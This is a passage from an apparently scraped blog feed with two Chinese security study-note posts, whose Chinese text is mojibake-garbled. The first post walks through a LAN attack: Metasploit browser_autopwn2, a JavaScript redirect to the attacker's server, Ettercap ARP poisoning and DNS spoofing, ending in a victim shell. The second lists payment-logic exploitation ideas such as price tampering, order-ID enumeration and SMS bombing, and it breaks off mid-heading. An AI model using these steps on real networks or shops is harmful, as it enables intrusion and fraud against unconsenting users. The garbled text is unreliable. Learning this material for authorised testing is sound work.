        <content type="html"><![CDATA[<h2 id="ä¸€ã€ä»‹ç»"><a href="#ä¸€ã€ä»‹ç»" class="headerlink" title="ä¸€ã€ä»‹ç»"></a>ä¸€ã€ä»‹ç»</h2><p>browser_autopwnæ˜¯Metasploitæä¾›çš„è¾…åŠ©åŠŸèƒ½æ¨¡å—ã€‚åœ¨ç”¨æˆ·è®¿é—®Webé¡µé¢æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨æ”»å‡»å—å®³è€…çš„æµè§ˆå™¨ã€‚åœ¨å¼€å§‹æ”»å‡»ä¹‹å‰ï¼Œbrowser_autopwnèƒ½å¤Ÿæ£€æµ‹ç”¨æˆ·ä½¿ç”¨çš„æµè§ˆå™¨ç±»å‹ï¼Œè‡ªåŠ¨éƒ¨ç½²æœ€åˆé€‚çš„exploitã€‚</p><a id="more"></a><h2 id="äºŒã€æµ‹è¯•ç¯å¢ƒ"><a href="#äºŒã€æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="äºŒã€æµ‹è¯•ç¯å¢ƒ"></a>äºŒã€æµ‹è¯•ç¯å¢ƒ</h2><ul><li><p>æœ¬åœ°å±€åŸŸç½‘ç»œ</p></li><li><p>Kali</p></li><li><p>Windows Server 2003 / xp </p></li></ul><h2 id="ä¸‰ã€ä½¿ç”¨å·¥å…·"><a href="#ä¸‰ã€ä½¿ç”¨å·¥å…·" class="headerlink" title="ä¸‰ã€ä½¿ç”¨å·¥å…·"></a>ä¸‰ã€ä½¿ç”¨å·¥å…·</h2><ul><li><p>Metasploit</p></li><li><p>Ettercap</p></li></ul><h2 id="å››ã€Exp"><a href="#å››ã€Exp" class="headerlink" title="å››ã€Exp"></a>å››ã€Exp</h2><p>browser_autopwn2</p><h2 id="äº”ã€ç›®çš„"><a href="#äº”ã€ç›®çš„" class="headerlink" title="äº”ã€ç›®çš„"></a>äº”ã€ç›®çš„</h2><p>å¦‚æœåœ¨åŒä¸€å±€åŸŸç½‘ï¼Œç›®æ ‡æœºå™¨ä¸Šæ²¡æœ‰å¯æˆåŠŸåˆ©ç”¨çš„ç«¯å£æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è¿›è¡Œæµè§ˆå™¨æ”»å‡»ã€‚é¦–å…ˆï¼Œåœ¨å±€åŸŸç½‘ä¸­ä½¿ç”¨DNSæ¬ºéª—ï¼Œå°†ç”¨æˆ·çš„æµé‡åŠ«æŒåˆ°æŒ‡å®šçš„ç«™ç‚¹ï¼Œè®¿é—®è¯¥ç«™ç‚¹é¡µé¢ä¼šè‡ªåŠ¨è·³è½¬è‡³æˆ‘ä»¬æ„é€ å¥½çš„æ¶æ„URLä¸Šï¼Œç„¶åè·å¾—åå¼¹shellï¼Œè¿™æ ·å°±èƒ½è¾¾åˆ°è·å–æƒé™ç›®çš„ã€‚</p><h2 id="å…­ã€æœåŠ¡ç«¯å‡†å¤‡"><a href="#å…­ã€æœåŠ¡ç«¯å‡†å¤‡" class="headerlink" title="å…­ã€æœåŠ¡ç«¯å‡†å¤‡"></a>å…­ã€æœåŠ¡ç«¯å‡†å¤‡</h2><h3 id="1-å¯åŠ¨MSF"><a href="#1-å¯åŠ¨MSF" class="headerlink" title="1. å¯åŠ¨MSF"></a>1. å¯åŠ¨MSF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start//å¯åŠ¨msfæ¡†æ¶æ‰€ä¾èµ–çš„æ•°æ®åº“</span><br><span class="line">msfconsole//å¯åŠ¨msfconsole</span><br></pre></td></tr></table></figure><h3 id="2-åŠ è½½Exp"><a href="#2-åŠ è½½Exp" class="headerlink" title="2. åŠ è½½Exp"></a>2. åŠ è½½Exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search browser_autopwn2//æœç´¢browser_autopwn2æ¨¡å—</span><br><span class="line">use auxiliary/server/browser_autopwn2//ä½¿ç”¨è¯¥æ¨¡å—</span><br><span class="line">show options//æŸ¥çœ‹å‚æ•°ï¼Œå¯é»˜è®¤æ— éœ€ä¿®æ”¹</span><br><span class="line">set//æŸ¥çœ‹è®¾ç½®å†…å®¹</span><br><span class="line">run//å¯åŠ¨æ¨¡å—</span><br></pre></td></tr></table></figure><p>ç­‰å¾…å‡ºç°URLï¼Œå’Œ Server started</p><h3 id="3-æ„é€ æ¶æ„URL"><a href="#3-æ„é€ æ¶æ„URL" class="headerlink" title="3. æ„é€ æ¶æ„URL"></a>3. æ„é€ æ¶æ„URL</h3><p>åœ¨Apacheä¸­å†™ä¸Šè‡ªåŠ¨è·³è½¬çš„ä»£ç ï¼Œå‘æ¶æ„URLä¸Šè·³è½¬</p><p>è¿™é‡Œé‡‡ç”¨javascriptå®ç°ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">// ä»¥ä¸‹æ–¹å¼å®šæ—¶è·³è½¬</span></span><br><span class="line"><span class="undefined">setTimeout("javascript:location.href='http://192.168.10.3:8080/Y3JY6DI6gql5iSu'", 5000); </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-å¯åŠ¨ç«™ç‚¹æœåŠ¡"><a href="#5-å¯åŠ¨ç«™ç‚¹æœåŠ¡" class="headerlink" title="5.å¯åŠ¨ç«™ç‚¹æœåŠ¡"></a>5.å¯åŠ¨ç«™ç‚¹æœåŠ¡</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br></pre></td></tr></table></figure><h2 id="ä¸ƒã€æ”»å‡»å®¢æˆ·ç«¯"><a href="#ä¸ƒã€æ”»å‡»å®¢æˆ·ç«¯" class="headerlink" title="ä¸ƒã€æ”»å‡»å®¢æˆ·ç«¯"></a>ä¸ƒã€æ”»å‡»å®¢æˆ·ç«¯</h2><h3 id="1-DNSæ¬ºéª—"><a href="#1-DNSæ¬ºéª—" class="headerlink" title="1. DNSæ¬ºéª—"></a>1. DNSæ¬ºéª—</h3><p><strong>ä½¿ç”¨Ettercap</strong></p><ol><li><p>æ‰“å¼€Ettercapçš„ DNSæ–‡ä»¶ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure><p>æ·»åŠ æ¬ºéª—çš„Aè®°å½•å’ŒPTRï¼ˆåå‘ï¼‰è®°å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.*.comA192.168.10.3</span><br><span class="line">www.*.comPTR192.168.10.3</span><br></pre></td></tr></table></figure></li><li><p>kaliä¸­è¾“å…¥ettercap -G è¿›å…¥è¯¥å·¥å…·çš„å›¾å½¢åŒ–ç•Œé¢ </p><p>èœå•æ é€‰æ‹©sniff â€“&gt; Unified sniffing â€“&gt;é€‰æ‹©ä¸Šç½‘ç½‘å¡ </p><p>èœå•æ é€‰æ‹©Hosts â€“&gt; Scan for Hosts â€“&gt; å†ç‚¹å‡»host list</p><ul><li><p>é€‰æ‹©æ¬ºéª—ç›®æ ‡çš„ç½‘å…³  æ·»åŠ åˆ°target1</p></li><li><p>é€‰æ‹©æ¬ºéª—ç›®æ ‡çš„IP æ·»åŠ åˆ°target2</p></li></ul><p>èœå•æ é€‰æ‹©Mitmâ€“&gt;ARP poisoningâ€“&gt;å‹¾é€‰Sniff remote connectionsï¼ˆARPæ¬ºéª—ï¼‰</p><p>èœå•æ é€‰æ‹©Pluginsâ€“&gt;Manage the pluginsâ€“&gt;é€‰æ‹©dns-spoofï¼ˆdnsæ¬ºéª—ï¼‰</p><p>æœ€åï¼Œèœå•æ ä¸­æ‰¾åˆ°startâ€“&gt;start sniffing</p></li></ol><h3 id="2-ç­‰å¾…ç›®æ ‡ä½¿ç”¨æµè§ˆå™¨"><a href="#2-ç­‰å¾…ç›®æ ‡ä½¿ç”¨æµè§ˆå™¨" class="headerlink" title="2. ç­‰å¾…ç›®æ ‡ä½¿ç”¨æµè§ˆå™¨"></a>2. ç­‰å¾…ç›®æ ‡ä½¿ç”¨æµè§ˆå™¨</h3><ol><li><p>ç›®æ ‡åœ°å€è®¿é—®ä»»æ„ç¬¦åˆè¯¥URLçš„é¡µé¢ï¼šwww.***.comï¼Œå³å¯æˆåŠŸè·³è½¬è‡³æ¶æ„URL</p></li><li><p>è®¿é—®æˆ‘ä»¬çš„æ¶æ„é¡µé¢åï¼Œè¯¥æ¨¡å—ä¼šè‡ªåŠ¨é€‰æ‹©æœ€åˆé€‚çš„exploitï¼Œè¿›è¡Œæ”»å‡»åˆ©ç”¨</p></li><li><p>ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œç›´åˆ°å‡ºç° Successfully migrated to process</p><p><img src="/2019/04/08/Metasploitåˆ©ç”¨-æµè§ˆå™¨è‡ªåŠ¨æ”»å‡»/1554724873153.png" alt="1554724873153"></p></li><li><p>æŸ¥çœ‹session</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -l</span><br></pre></td></tr></table></figure></li><li><p>é€‰æ‹©ç›¸åº”åºå·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure></li><li><p>getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p><img src="/2019/04/08/Metasploitåˆ©ç”¨-æµè§ˆå™¨è‡ªåŠ¨æ”»å‡»/1554725111543.png" alt="1554725111543"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> æµè§ˆå™¨æ”»å‡» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€»è¾‘æ¼æ´æŒ–æ˜æ€è·¯-æ”¯ä»˜é€»è¾‘</title>
      <link href="/2019/04/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91/"/>
      <url>/2019/04/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€ç°åœ¨srcå…³æ³¨çš„é‡ç‚¹"><a href="#ä¸€ã€ç°åœ¨srcå…³æ³¨çš„é‡ç‚¹" class="headerlink" title="ä¸€ã€ç°åœ¨srcå…³æ³¨çš„é‡ç‚¹"></a>ä¸€ã€ç°åœ¨srcå…³æ³¨çš„é‡ç‚¹</h2><p>â€‹    éšç€å¸¸è§„æ¼æ´çš„é£é™©é™ä½ï¼Œä»¥åŠæŒ–æ˜éš¾åº¦çš„å¢åŠ ï¼Œç°åœ¨çš„srcæ›´å¤šçš„å…³æ³¨ç‚¹ï¼Œä¹Ÿå°±æ˜¯ç™½å¸½å­å…³æ³¨çš„é‡ç‚¹æ˜¯é€»è¾‘æ¼æ´ã€‚é€»è¾‘æ¼æ´ä¸è¦æ±‚æœ‰å¾ˆæ·±çš„åŸºç¡€ï¼Œæ¯”å¦‚sqlæ³¨å…¥æ‰‹å·¥æ³¨å…¥éœ€è¦å¯¹sqlæ³¨å…¥æœ‰å¾ˆæ·±åšçš„ç†è§£ï¼›é€»è¾‘æ¼æ´åªéœ€è¦å¯¹ä¸šåŠ¡é€»è¾‘å’Œå…³é”®å‚æ•°æœ‰ä¸€å®šçš„äº†è§£ï¼Œå‰©ä¸‹çš„çœ‹è¿æ°”ã€‚</p><a id="more"></a><h2 id="äºŒã€åˆ·srcä¹‹å‰çš„å‡†å¤‡"><a href="#äºŒã€åˆ·srcä¹‹å‰çš„å‡†å¤‡" class="headerlink" title="äºŒã€åˆ·srcä¹‹å‰çš„å‡†å¤‡"></a>äºŒã€åˆ·srcä¹‹å‰çš„å‡†å¤‡</h2><h3 id="1-ä¿¡æ¯æ”¶é›†ï¼ˆæ³›è®²ï¼‰"><a href="#1-ä¿¡æ¯æ”¶é›†ï¼ˆæ³›è®²ï¼‰" class="headerlink" title="1. ä¿¡æ¯æ”¶é›†ï¼ˆæ³›è®²ï¼‰"></a>1. ä¿¡æ¯æ”¶é›†ï¼ˆæ³›è®²ï¼‰</h3><p>â€‹    æ¸—é€æµ‹è¯•å’Œæ¼æ´æŒ–æ˜ï¼Œä¿¡æ¯æ”¶é›†æ˜¯è´¯å½»äºæ•´ä¸ªæµç¨‹çš„ï¼›åœ¨è¿›è¡ŒsrcæŒ–æ˜ä¹‹å‰ï¼Œè¦è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œåœ¨ç¡®å®šæ¼æ´äº§ç”Ÿä»€ä¹ˆå±å®³çš„æ—¶å€™ï¼Œä¹Ÿè¦è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œä¹Ÿå°±æ˜¯è¯´æ¸—é€æµ‹è¯•å’Œæ¼æ´æŒ–æ˜çš„æœ¬è´¨å°±æ˜¯ä¿¡æ¯æ”¶é›†ã€‚</p><h3 id="2-å…·ä½“è¦æ”¶é›†å“ªäº›ä¿¡æ¯"><a href="#2-å…·ä½“è¦æ”¶é›†å“ªäº›ä¿¡æ¯" class="headerlink" title="2. å…·ä½“è¦æ”¶é›†å“ªäº›ä¿¡æ¯"></a>2. å…·ä½“è¦æ”¶é›†å“ªäº›ä¿¡æ¯</h3><ol><li><p>å‚å•†åŸŸåå’ŒIPæ®µï¼ˆæµ‹è¯•èŒƒå›´ç•Œå®šï¼‰</p><p>ä¸»ç«™ï¼ˆå¯èƒ½é˜²æŠ¤è¾ƒå¥½ï¼‰ï¼Œå­ç«™ï¼ˆå­åŸŸåæ”¶é›†ï¼‰</p><p>ï¼ˆæ˜ç¡®æµ‹è¯•èŒƒå›´ï¼Œå¦‚æœæŸ¥å‡ºèŒƒå›´ï¼Œæœ‰å¯èƒ½æ‰¿æ‹…æ³•å¾‹é£é™©ï¼‰</p></li><li><p>å‚å•†ä¸šåŠ¡ä¿¡æ¯ï¼ˆè§„åˆ’ï¼‰</p><ul><li><p>å¦‚æœä¸šåŠ¡æ¶æ„è¾ƒå°ï¼Œæ¼æ´æœ‰é™ï¼Œä¸å¿…å»æ·±æŒ–</p></li><li><p>å¦‚æœä¸šåŠ¡æ¶æ„éå¸¸å¤§ï¼Œå¯ä»¥æŒä¹…çš„æŒ–</p></li></ul></li><li><p>å­åŸŸåæ”¶é›†</p></li><li><p>IPæ®µ</p></li><li><p>ç«¯å£ï¼ˆç«¯å£å¯¹åº”ä¸šåŠ¡ï¼‰</p></li><li><p>ç²¾å‡†å­—å…¸</p><ul><li><p>ç¤¾å·¥å­—å…¸ï¼ˆç«™é•¿ä¿¡æ¯ï¼Œç«™ç‚¹ä¿¡æ¯ï¼‰ï¼Œ</p><p>æé«˜å‡†ç¡®åº¦ï¼Œä¹Ÿå¢å¼ºè‡ªå·±çš„èƒ½åŠ›</p></li><li><p>ä¸æ–­æ”¶é›†å­—å…¸ï¼Œå¸¸è§çš„ï¼ˆä¾‹ï¼šå›½äºº100å¼±å¯†ç ï¼‰</p></li></ul></li><li><p>æ•æ„Ÿæ¥å£</p><p>è›‹ç³•é‚£ä¹ˆå°ï¼Œäººé‚£ä¹ˆå¤šï¼Œå¦‚æœä¸é€‰æ‹©ä¸€äº›ä¸å¼•äººæ³¨æ„çš„èŒƒå›´è¿›è¡Œåˆ©ç”¨çš„è¯ï¼Œå¯èƒ½è¿ç²¥éƒ½æ²¡å¾—å–ï¼ˆç®€å•ä¾‹ï¼šå¦‚æœæ¥å£å¤–éœ²ï¼Œå¯ä»¥é¢‘ç¹çš„å‘èµ·çŸ­ä¿¡è½°ç‚¸ï¼‰</p></li><li><p>å…¶ä»–ä¿¡æ¯ç­‰</p></li></ol><h3 id="3-éœ€è¦å‡†å¤‡ä»€ä¹ˆå·¥å…·"><a href="#3-éœ€è¦å‡†å¤‡ä»€ä¹ˆå·¥å…·" class="headerlink" title="3. éœ€è¦å‡†å¤‡ä»€ä¹ˆå·¥å…·"></a>3. éœ€è¦å‡†å¤‡ä»€ä¹ˆå·¥å…·</h3><p>Burp suite and fiddlerã€Browseræµè§ˆå™¨</p><p>æˆ–è€…ä»…éœ€æµè§ˆå™¨å³å¯</p><h2 id="ä¸‰ã€æŒ–æ˜æ€è·¯"><a href="#ä¸‰ã€æŒ–æ˜æ€è·¯" class="headerlink" title="ä¸‰ã€æŒ–æ˜æ€è·¯"></a>ä¸‰ã€æŒ–æ˜æ€è·¯</h2><h3 id="1-é”å®šå…³é”®å˜é‡ä¸æ·±å…¥é€»è¾‘"><a href="#1-é”å®šå…³é”®å˜é‡ä¸æ·±å…¥é€»è¾‘" class="headerlink" title="1. é”å®šå…³é”®å˜é‡ä¸æ·±å…¥é€»è¾‘"></a>1. é”å®šå…³é”®å˜é‡ä¸æ·±å…¥é€»è¾‘</h3><ul><li><p>é”å®šå…³é”®å¯æ§å˜é‡</p></li><li><p>æ·±å…¥äº†è§£é€»è¾‘ï¼Œè¿›ä¸€æ­¥ç»•è¿‡</p></li></ul><p>â€‹    ä¸æ˜¯å•çº¯çš„é å·¥å…·è·‘å‡ºæ¥ï¼Œç”¨å·¥å…·è·‘å‡ºæ¥çš„æ¼æ´ï¼Œä¸èƒ½å«æ¼æ´äº†ï¼Œå› ä¸ºæ²¡æœ‰ä½ ä»»ä½•ä»·å€¼çš„ä½“ç°ã€‚</p><p>â€‹    ä¾‹å¦‚sqlæ³¨å…¥å…³é”®å˜é‡æ˜¯ä¸€ä¸ªidçš„è¯ï¼Œæ­¤æ—¶å°±è¦æ·±å…¥çš„åˆ¤æ–­å®ƒçš„ä¸€äº›å­—ç¬¦å‹ã€æ•°å­—å‹ä»¥åŠå¯¹å®ƒçš„é€»è¾‘è¿›ä¸€æ­¥å»æŒ–æ˜ã€‚</p><p>â€‹    æ‰€ä»¥è¯´ä¸ç®¡æŒ–å“ªäº›æ¼æ´ï¼Œå…¶å®æœ¬è´¨å°±æ˜¯è¿™ä¸ªæ ·å­çš„ï¼Œé¦–å…ˆé”å®šä¸€ä¸ªå…³é”®çš„æ¼æ´ï¼Œç´§æ¥ç€æ·±å…¥äº†è§£ä¸€ä¸‹ä»–çš„é€»è¾‘å…·ä½“æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼Œç„¶åè¿›ä¸€æ­¥çš„è¿›è¡Œç»•è¿‡ã€‚</p><h3 id="2-é€»è¾‘æ¼æ´çš„å®šä¹‰"><a href="#2-é€»è¾‘æ¼æ´çš„å®šä¹‰" class="headerlink" title="2. é€»è¾‘æ¼æ´çš„å®šä¹‰"></a>2. é€»è¾‘æ¼æ´çš„å®šä¹‰</h3><p>ç”±äºç¨‹åºé€»è¾‘ä¸ä¸¥è°¨ï¼Œå¯¼è‡´é€»è¾‘æœªèƒ½æ­£å¸¸å¤„ç†æˆ–å¤„ç†é”™è¯¯çš„æ¼æ´æˆä¸ºé€»è¾‘æ¼æ´ã€‚</p><p>é›¶ä¿¡ä»»åŸåˆ™ï¼šä¸ç®¡ç”¨æˆ·è¾“å…¥ä»»ä½•ä¸œè¥¿ï¼Œéƒ½æ˜¯é›¶ä¿¡ä»»çš„ã€‚</p><h3 id="3-äº†è§£é€»è¾‘ä¸šåŠ¡"><a href="#3-äº†è§£é€»è¾‘ä¸šåŠ¡" class="headerlink" title="3. äº†è§£é€»è¾‘ä¸šåŠ¡"></a>3. äº†è§£é€»è¾‘ä¸šåŠ¡</h3><p>å¦‚æœä¸äº†è§£ä¸šåŠ¡ï¼Œå°±å¼€å§‹æ‰¾æ¼æ´ï¼Œå¯èƒ½å°±ä¼šé™·å…¥ç›²ç›®ï¼Œæ¯”è¾ƒè´¹æ—¶é—´ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•æˆæœï¼Œæ‰“æ¶ˆè‡ªå·±çš„è‡ªä¿¡åŠ›ï¼›æ‰€ä»¥å…ˆå¯¹ä¸šåŠ¡æœ‰ä¸€å®šçš„äº†è§£ï¼Œå“ªä¸ªæ¨¡å—å¯èƒ½ä¼šå‡ºç°é‚£äº›æ¼æ´</p><p>ä¾‹å¦‚è¡¨å•ï¼Œä¸€èˆ¬ä¼šè·Ÿæ•°æ®åº“æœ‰äº¤äº’ï¼Œå°±å¯èƒ½å­˜åœ¨sqlæ³¨å…¥</p><p>ä»¥ä¸‹ä¸ºå‚è€ƒ</p><ul><li>ç”µå•†è¡Œä¸š</li></ul><p><img src="/2019/04/07/é€»è¾‘æ¼æ´æŒ–æ˜æ€è·¯-æ”¯ä»˜é€»è¾‘/1554553268179.png" alt="1554553268179"></p><ul><li>P2Pé‡‘è</li></ul><p><img src="/2019/04/07/é€»è¾‘æ¼æ´æŒ–æ˜æ€è·¯-æ”¯ä»˜é€»è¾‘/1554553286437.png" alt="1554553286437"></p><h2 id="å››ã€æ”¯ä»˜æ¼æ´æŒ–æ˜"><a href="#å››ã€æ”¯ä»˜æ¼æ´æŒ–æ˜" class="headerlink" title="å››ã€æ”¯ä»˜æ¼æ´æŒ–æ˜"></a>å››ã€æ”¯ä»˜æ¼æ´æŒ–æ˜</h2><p>åœ¨æ”¯ä»˜ç¯èŠ‚ä¸­ç”±äºé€»è¾‘ä¸ä¸¥è°¨è€Œäº§ç”Ÿçš„æ¼æ´ç§°ä¸ºæ”¯ä»˜æ¼æ´</p><p>srcä¸ä¼šæ‹’ç»çš„ï¼Œå…¶ä»–çš„å¯èƒ½ä¼šæ‰“æ“¦è¾¹çƒï¼Œä½†æ˜¯æ¶‰åŠåˆ°é’±çš„é—®é¢˜ï¼Œå¯¹å•†å®¶æˆ–å‚å®¶æ˜¯é‡ä¸­ä¹‹é‡</p><h3 id="1-æ˜ç¡®æŒ–æ´æ­¥éª¤"><a href="#1-æ˜ç¡®æŒ–æ´æ­¥éª¤" class="headerlink" title="1. æ˜ç¡®æŒ–æ´æ­¥éª¤"></a>1. æ˜ç¡®æŒ–æ´æ­¥éª¤</h3><ol><li>æ˜ç¡®æ”¯ä»˜ç‚¹</li><li>å¯»æ‰¾å…³é”®å¯æ§å˜é‡</li><li>æŠ“åŒ…æ”¾åŒ…å¯¹æ¯”</li></ol><h3 id="2-æŠ€å·§"><a href="#2-æŠ€å·§" class="headerlink" title="2. æŠ€å·§"></a>2. æŠ€å·§</h3><ul><li><p>ä¸¤ä¸ªè´¦å·Aã€B</p></li><li><p>Aèµ°ä¸€éæµç¨‹ï¼›</p></li><li><p>Bè´Ÿè´£åœ¨Aè´¦å·æ­£å¸¸æµç¨‹ç ´åçš„</p></li></ul><p>ä¾‹ï¼šæ‰¾å›å¯†ç </p><h3 id="3-æ”¯ä»˜æµç¨‹"><a href="#3-æ”¯ä»˜æµç¨‹" class="headerlink" title="3. æ”¯ä»˜æµç¨‹"></a>3. æ”¯ä»˜æµç¨‹</h3><p>ç”¨æˆ·è®¢è´­ï¼š</p><ul><li>ä¿¡æ¯æ³„éœ²/è¶Šæƒ<ul><li>id+/-</li></ul></li></ul><p>â†“</p><p>é‡‘é¢ï¼š</p><ul><li><p>ä¿®æ”¹é‡‘é¢</p><ul><li>æ­£è´Ÿé€»è¾‘</li><li>0.01æ¨¡å¼</li><li>æœ€å¤§å€¼è¶Šç•Œ</li></ul></li><li><p>ç§¯åˆ†æ¢è´­</p><ul><li>ç§¯åˆ†æŠµæ‰£</li><li>ç§¯åˆ†å…‘æ¢</li></ul></li></ul><p>â†“</p><p>ç”Ÿæˆè®¢å•ï¼š</p><ul><li>æ›´æ”¹çŠ¶æ€<ul><li>æ¥å£æ›´æ”¹</li><li>æ›´æ”¹å…³é”®å€¼</li></ul></li></ul><p>â†“</p><p>æ‰£é™¤é‡‘é¢</p><p>â†“</p><p>åº“å­˜ - 1</p><ul><li>å¤šçº¿ç¨‹å¹¶å‘ï¼ˆ-99999999ï¼‰å½±å“äº¤æ˜“</li></ul><p>â†“</p><p>æ”¶è´§é˜¶æ®µ</p><ul><li>ç¡®è®¤æ”¶è´§<ul><li>ç»•è¿‡å®¢æˆ·ç›´æ¥ç¡®è®¤æ”¶è´§</li></ul></li><li>é€€è´§<ul><li>æ›´æ”¹è´§ç‰©çŠ¶æ€</li><li>æ›´æ”¹é€€è´§ä»·æ ¼</li></ul></li></ul><h3 id="4-å…·ä½“æ€è·¯"><a href="#4-å…·ä½“æ€è·¯" class="headerlink" title="4. å…·ä½“æ€è·¯"></a>4. å…·ä½“æ€è·¯</h3><p><strong>ä¸€ã€è®¢å•æ¨¡å—</strong></p><ol><li>ä¸‹å•ä¹‹åä¿®æ”¹å•†å“ä»·æ ¼</li><li>ä¸‹å•ä¹‹åæ›´æ”¹æ•°é‡è®¾ä¸ºè´Ÿæ•°ï¼Œäº§ç”Ÿæ­£è´Ÿé€»è¾‘</li><li>å¹¶å‘è´­ä¹°æ˜¯å¦å‡ºç°é€»è¾‘é—®é¢˜</li><li>å•†å“ä¸º0ï¼Œæ˜¯å¦å­˜åœ¨è´­ä¹°çš„å¯èƒ½</li><li>ç”Ÿæˆè®¢å•æ—¶ä¿®æ”¹è®¢å•é‡‘é¢</li></ol><p><strong>äºŒã€ç»“ç®—æ¨¡å—</strong></p><ol><li>ä¼˜æƒ åŠµé‡å¤åˆ©ç”¨</li><li>ä¿®æ”¹ç»“ç®—çš„çŠ¶æ€</li><li>æ›´æ”¹æ”¯ä»˜çš„APIæˆ–è€…æ”¯ä»˜æ¨¡å¼ï¼ˆè½¬ä¸ºç¬¬ä¸‰æ–¹ï¼‰</li><li>ä¼ªé€ æˆåŠŸç»“ç®—çš„è¯·æ±‚</li></ol><p><strong>ä¸‰ã€é€€è´§æ¨¡å—</strong></p><ol><li>æ›´æ”¹è´§ç‰©çŠ¶æ€</li><li>æ›´æ”¹é€€è´§ä»·æ ¼</li></ol><p><strong>å››ã€æ”¶è´§æ¨¡å—</strong></p><ol><li>ç»•è¿‡å®¢æˆ·ç›´æ¥ç¡®è®¤æ”¶è´§</li></ol><h3 id="5-å…·ä½“åœºæ™¯"><a href="#5-å…·ä½“åœºæ™¯" class="headerlink" title="5. å…·ä½“åœºæ™¯"></a>5. å…·ä½“åœºæ™¯</h3><p><img src="/2019/04/07/é€»è¾‘æ¼æ´æŒ–æ˜æ€è·¯-æ”¯ä»˜é€»è¾‘/1554555632056.png" alt="1554555632056"></p><h3 id="6-ä¸¾ä¾‹"><a href="#6-ä¸¾ä¾‹" class="headerlink" title="6. ä¸¾ä¾‹"></a>6. ä¸¾ä¾‹</h3><h4 id="1-ä¿¡æ¯æ³„éœ²-è¶Šæƒ"><a href="#1-ä¿¡æ¯æ³„éœ²-è¶Šæƒ" class="headerlink" title="1. ä¿¡æ¯æ³„éœ²/è¶Šæƒ"></a>1. ä¿¡æ¯æ³„éœ²/è¶Šæƒ</h4><p><strong>ä¾‹1ï¼š</strong></p><p>ç¬¬ä¸€æ­¥ï¼šæ˜ç¡®æ”¯ä»˜ç‚¹ï¼šè´­ç¥¨</p><p>ç¬¬äºŒæ­¥ï¼šå¯»æ‰¾å…³é”®å¯æ§å˜é‡</p><p>å…³é”®å˜é‡ï¼š</p><ul><li>è®¢å•idå’Œç”¨æˆ·idï¼ˆå˜é‡æœªåŠ å¯†ï¼‰</li><li>å˜é‡åŠ å¯†<ul><li>å‰ç«¯JSåŠ å¯†</li><li>Ajaxå¼‚æ­¥åŠ è½½è¯·æ±‚</li><li>åç«¯åŠ å¯†</li></ul></li></ul><p>ç¬¬ä¸‰æ­¥ï¼šæŠ“åŒ…æ”¾åŒ…å¯¹æ¯”</p><ul><li>è®¢å•idå¢å‡ï¼Œç”¨æˆ·idå¢å‡ï¼ŒåŒæ—¶å¢å‡ï¼ˆå¹³è¡Œè¶Šæƒé€ æˆè®¢å•ä¿¡æ¯æ³„éœ²ï¼‰</li></ul><p><strong>ä¾‹2ï¼š</strong></p><p>ç¬¬ä¸€æ­¥ï¼šæ˜ç¡®æ”¯ä»˜ç‚¹ï¼šé…’åº—é¢„è®¢</p><p>ç¬¬äºŒæ­¥ï¼šå¯»æ‰¾å…³é”®å¯æ§å˜é‡</p><ul><li>å…³é”®å˜é‡ï¼šè®¢å•idå’Œä»·æ ¼å˜é‡ï¼ˆå˜é‡æœªåŠ å¯†ï¼‰</li></ul><p>ç¬¬ä¸‰æ­¥ï¼šæŠ“åŒ…æ”¾åŒ…å¯¹æ¯”</p><p>è®¢å•idå¢å‡ï¼Œå®ç°è®¢å•éå†</p><h4 id="2-æ­£è´Ÿé€»è¾‘ï¼šä¿®æ”¹æ•°é‡"><a href="#2-æ­£è´Ÿé€»è¾‘ï¼šä¿®æ”¹æ•°é‡" class="headerlink" title="2. 